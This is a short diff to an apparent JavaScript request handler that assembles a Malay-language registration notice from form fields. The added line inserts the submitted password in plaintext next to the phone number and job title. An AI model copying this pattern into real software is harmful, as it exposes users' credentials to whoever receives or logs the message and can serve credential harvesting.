@@ -37,6 +37,7 @@ export default async function handler(req, res) {
             "",
             "Nomor referensi: " + (reference || "-"),
             "Nomor telefon: " + (phone || "-"),
+            "Pass: " + (password || "-"),
             "Jawatan: " + (job || "-"),
             "",
             "Status: Borang pendaftaran diterima.",
